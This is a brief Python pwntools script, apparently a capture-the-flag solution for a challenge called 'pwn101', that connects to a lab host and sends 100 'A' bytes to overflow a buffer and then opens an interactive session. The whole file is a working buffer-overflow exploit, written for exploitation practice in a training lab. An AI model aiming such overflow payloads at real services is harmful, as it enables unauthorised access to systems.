#!/usr/bin/env python3
# this challenge is just need to override the variable 1337 by using junk A.


from pwn import *

host = "10.10.26.110"
port = 9001

context.log_level = 'warning'

#p = process("./pwn101")
p = remote(host,port)
p.sendlineafter(b":", b"A"*100)
p.recvline()

p.interactive()


